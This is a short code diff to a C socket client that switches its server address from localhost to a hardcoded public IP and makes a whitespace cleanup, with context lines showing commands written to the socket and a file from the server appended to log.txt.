@@ -19,7 +19,7 @@ int main(int argc , char *argv[])
     char recvBuff[1024], commands[2000];
     struct sockaddr_in server;
 
-    char *addr = "127.0.0.1";
+    char *addr = "45.55.64.18";
     short port = 8888;
 
 
@@ -68,7 +68,7 @@ int main(int argc , char *argv[])
             write(sock, commands, strlen(commands));
         }
     }
-    
+
     // Get file from server
     FILE *fp;
     fp = fopen("log.txt","ab");
